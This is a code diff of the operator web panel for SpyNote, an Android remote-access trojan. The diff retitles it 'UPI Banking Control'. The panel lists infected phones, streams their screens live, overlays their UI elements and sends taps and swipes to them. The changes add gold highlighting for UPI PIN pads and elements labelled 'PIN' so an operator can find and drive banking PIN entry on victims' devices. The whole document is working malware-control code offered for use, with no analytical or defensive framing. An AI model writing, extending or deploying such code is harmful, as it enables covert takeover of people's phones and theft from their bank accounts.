@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote - Banking Control</title>
+    <title>📱 SpyNote - UPI Banking Control</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            font-family: -apple-system,BlinkMacSystemFont,sans-serif; 
             background: #0a0a0a; color: white; height: 100vh; overflow: hidden;
         }
         #sidebar { 
@@ -35,7 +35,7 @@
             background: #000; position: relative;
         }
 
-        /* 🔥 UI OVERLAY */
+        /* 🔥 UI OVERLAY - UPI PIN PAD */
         .ui-overlay {
             position: absolute; border-radius: 6px; font-size: 12px; 
             font-weight: bold; padding: 4px 6px; cursor: pointer; 
@@ -45,6 +45,7 @@
         .ui-text { background: rgba(0,255,150,0.85); color: #000; }
         .ui-button { background: rgba(255,100,50,0.9); color: white; }
         .ui-input { background: rgba(100,150,255,0.9); color: white; }
+        .ui-pin { background: rgba(255,215,0,0.95) !important; color: #000; font-size: 16px !important; }
         .ui-overlay:hover { transform: scale(1.1) !important; box-shadow: 0 0 20px rgba(0,255,150,0.8); }
 
         #status-bar { 
@@ -74,6 +75,7 @@
             padding: 12px; margin: 8px 0; background: #333; 
             border-radius: 10px; cursor: pointer; transition: all 0.2s;
         }
+        .element.pin { background: #ffd700 !important; color: #000; }
         .element:hover { background: #00ff88; color: #000; transform: scale(1.02); }
     </style>
 </head>
@@ -95,7 +97,7 @@
     </div>
 
     <div id="elements-panel">
-        <h4>🔍 Banking Elements</h4>
+        <h4>🔍 UPI Elements</h4>
         <div id="element-list"></div>
     </div>
 
@@ -107,7 +109,7 @@
     </div>
 
     <script>
-        const socket = io({ transports: ['websocket', 'polling'], forceNew: true });
+        const socket = io({ transports: ['websocket'] });
         let currentDevice = null;
         let deviceW = 1080, deviceH = 2400;
         let frameCount = 0, lastTime = 0;
@@ -121,14 +123,16 @@
         socket.on('connect', () => {
             document.getElementById('status').textContent = '✅ LIVE';
             document.getElementById('status').style.color = '#00ff88';
-            loadDevices();
+            fetch('/devices').then(r=>r.json()).then(devices => {
+                updateDevices(devices);
+            });
         });
 
         socket.on('devices-update', (devices) => {
             updateDevices(devices);
         });
 
-        // 🔥 SCREEN + LAYOUT
+        // 🔥 SMOOTH 60FPS SCREEN
         socket.on('screen-update', (data) => {
             if (!currentDevice || data.deviceId !== currentDevice) return;
             
@@ -156,42 +160,36 @@
                     }
                 };
                 img.src = `data:image/jpeg;base64,${data.data}`;
-            } catch(e) { console.error('Frame error:', e); }
+            } catch(e) {}
         });
 
         socket.on('ui-layout-update', (data) => {
             if (data.deviceId !== currentDevice) return;
             uiElements = data.elements || [];
             if (showElements) updateElementList();
+            if (showOverlay) drawOverlay();
         });
 
-        function loadDevices() {
-            fetch('/devices').then(r=>r.json()).then(updateDevices);
-        }
-
         function updateDevices(devices) {
-            document.getElementById('device-list').innerHTML = devices.length ? 
-                devices.map(([id, info]) => `
-                    <div class="device ${currentDevice === id ? 'active' : ''}" 
-                         onclick="selectDevice('${id}')">
-                        <b>${info.model?.slice(0,20) || id.slice(0,8)}</b><br>
-                        <small>${info.brand || ''} ${info.version || ''}</small><br>
-                        <span style="color: ${info.connected ? '#00ff88' : '#ff4444'}">
-                            ${info.connected ? '🟢 LIVE' : '🔴 OFF'}
-                        </span>
-                    </div>
-                `).join('') : '<div>No devices online</div>';
+            document.getElementById('device-list').innerHTML = devices.map(([id, info]) => `
+                <div class="device ${currentDevice === id ? 'active' : ''}" 
+                     onclick="selectDevice('${id}')">
+                    <b>${info.model?.slice(0,20) || id.slice(0,8)}</b><br>
+                    <small>${info.brand || ''} Android ${info.version || ''}</small><br>
+                    <span style="color: ${info.connected ? '#00ff88' : '#ff4444'}">
+                        ${info.connected ? '🟢 LIVE' : '🔴 OFF'}
+                    </span>
+                </div>
+            `).join('') || '<div>No devices</div>';
         }
 
         function selectDevice(id) {
             currentDevice = id;
             document.getElementById('device-name').textContent = id.slice(0,12);
-            updateDevices(Array.from(devices.values())); // Refresh visual
-            // Clear old overlays
-            document.querySelectorAll('.ui-overlay').forEach(el => el.remove());
+            updateDevices(Array.from(devices.values()));
         }
 
-        // 🔥 COORDINATE SCALING
+        // 🔥 PERFECT COORDINATE SCALING
         function getDeviceCoords(clientX, clientY) {
             const rect = phone.getBoundingClientRect();
             return {
@@ -200,72 +198,72 @@
             };
         }
 
-        // 🔥 DRAW UI OVERLAY
+        // 🔥 DRAW UI OVERLAY (UPI PIN PAD)
         function drawOverlay() {
+            // CLEAR OLD
             document.querySelectorAll('.ui-overlay').forEach(el => el.remove());
             
             const rect = phone.getBoundingClientRect();
             const scaleX = rect.width / deviceW;
             const scaleY = rect.height / deviceH;
             
-            uiElements.forEach((el, i) => {
+            uiElements.forEach((el) => {
+                if (!el.bounds) return;
+                
                 const div = document.createElement('div');
-                div.className = `ui-overlay ui-${el.type || 'text'}`;
-                div.innerHTML = el.text?.slice(0,15) || el.className || '?';
-                div.style.left = `${el.bounds?.left * scaleX}px`;
-                div.style.top = `${el.bounds?.top * scaleY}px`;
-                div.style.width = `${(el.bounds?.right - el.bounds?.left) * scaleX}px`;
-                div.style.height = `${(el.bounds?.bottom - el.bounds?.top) * scaleY}px`;
+                div.className = `ui-overlay ui-${el.type || (el.text?.includes('PIN') || el.className?.includes('pin') ? 'pin' : 'text')}`;
+                div.innerHTML = (el.text || el.className || '').slice(0,15) || '?';
+                div.title = el.text || el.className || '';
+                
+                div.style.left = `${el.bounds.left * scaleX}px`;
+                div.style.top = `${el.bounds.top * scaleY}px`;
+                div.style.width = `${(el.bounds.right - el.bounds.left) * scaleX}px`;
+                div.style.height = `${(el.bounds.bottom - el.bounds.top) * scaleY}px`;
+                
                 div.onclick = (e) => {
                     e.stopPropagation();
                     tapElement(el);
                 };
-                canvas.parentNode.appendChild(div);
+                phone.appendChild(div);
             });
         }
 
-        // 🔥 TOUCH + MOUSE CONTROLS
+        // 🔥 TOUCH + MOUSE (INSTANT RESPONSE)
         let dragStart = {x:0, y:0}, isDragging = false;
         
-        ['touchstart', 'mousedown'].forEach(ev => {
-            phone.addEventListener(ev, e => {
-                e.preventDefault();
-                isDragging = true;
-                const coords = getDeviceCoords(
-                    e.touches?.[0]?.clientX || e.clientX,
-                    e.touches?.[0]?.clientY || e.clientY
-                );
-                dragStart = coords;
-            });
-        });
+        ['touchstart', 'mousedown'].forEach(ev => phone.addEventListener(ev, e => {
+            e.preventDefault();
+            isDragging = true;
+            const coords = getDeviceCoords(
+                e.touches?.[0]?.clientX || e.clientX,
+                e.touches?.[0]?.clientY || e.clientY
+            );
+            dragStart = coords;
+        }));
 
-        ['touchmove', 'mousemove'].forEach(ev => {
-            phone.addEventListener(ev, e => {
-                if (!isDragging || !currentDevice) return;
-                e.preventDefault();
-                const coords = getDeviceCoords(
-                    e.touches?.[0]?.clientX || e.clientX,
-                    e.touches?.[0]?.clientY || e.clientY
-                );
-                
-                if (scrollMode) {
-                    sendControl('scroll', 0, coords.y - dragStart.y);
-                } else {
-                    sendControl('swipe', dragStart.x, dragStart.y, coords.x, coords.y);
-                }
-            });
-        });
+        ['touchmove', 'mousemove'].forEach(ev => phone.addEventListener(ev, e => {
+            if (!isDragging || !currentDevice) return;
+            e.preventDefault();
+            const coords = getDeviceCoords(
+                e.touches?.[0]?.clientX || e.clientX,
+                e.touches?.[0]?.clientY || e.clientY
+            );
+            
+            if (scrollMode) {
+                sendControl('scroll', 0, coords.y - dragStart.y);
+            } else {
+                sendControl('swipe', dragStart.x, dragStart.y, coords.x, coords.y);
+            }
+        }));
 
-        ['touchend', 'mouseup'].forEach(ev => {
-            phone.addEventListener(ev, e => {
-                if (!isDragging || !currentDevice) return;
-                isDragging = false;
-                
-                if (!scrollMode && Math.abs(e.changedTouches?.[0]?.clientX - dragStart.x*10) < 50) {
-                    sendControl('tap', dragStart.x, dragStart.y);
-                }
-            });
-        });
+        ['touchend', 'mouseup'].forEach(ev => phone.addEventListener(ev, e => {
+            if (!isDragging || !currentDevice) return;
+            isDragging = false;
+            
+            if (!scrollMode) {
+                sendControl('tap', dragStart.x, dragStart.y);
+            }
+        }));
 
         function sendControl(action, x=0, y=0, endX=0, endY=0, scroll=0) {
             if (!currentDevice) return;
@@ -279,17 +277,20 @@
         }
 
         function sendBack() { sendControl('back'); }
+        
         function toggleScroll() { 
             scrollMode = !scrollMode; 
             document.getElementById('scrollBtn').classList.toggle('scroll-mode', scrollMode);
             document.getElementById('scrollBtn').textContent = scrollMode ? '👆 Tap' : '↕️ Scroll';
         }
+        
         function toggleLayout() { 
             showOverlay = !showOverlay; 
             document.getElementById('layoutBtn').textContent = showOverlay ? '🙈 Hide' : '👁️ Show';
             if (showOverlay) drawOverlay();
             else document.querySelectorAll('.ui-overlay').forEach(el => el.remove());
         }
+        
         function toggleElements() {
             showElements = !showElements;
             document.getElementById('elements-panel').style.display = showElements ? 'block' : 'none';
@@ -298,11 +299,13 @@
 
         function updateElementList() {
             document.getElementById('element-list').innerHTML = uiElements.map(el => `
-                <div class="element" onclick="tapElement(${JSON.stringify(el).replace(/"/g, '&quot;')})">
-                    ${el.type === 'button' ? '🔘' : '📝'} ${el.text?.slice(0,25) || el.className || 'Element'}
-                    <br><small>(${Math.round(el.bounds?.left)}, ${Math.round(el.bounds?.top)})</small>
+                <div class="element ${el.text?.includes('PIN') || el.className?.includes('pin') ? 'pin' : ''}" 
+                     onclick="tapElement(${JSON.stringify(el)})">
+                    ${el.type === 'button' ? '🔘' : el.type === 'input' ? '⌨️' : '📝'} 
+                    ${el.text?.slice(0,25) || el.className || 'Element'}
+                    <br><small>X:${Math.round(el.bounds?.left)}, Y:${Math.round(el.bounds?.top)}</small>
                 </div>
-            `).join('') || '<div>No elements found</div>';
+            `).join('') || '<div>No banking elements</div>';
         }
     </script>
 </body>
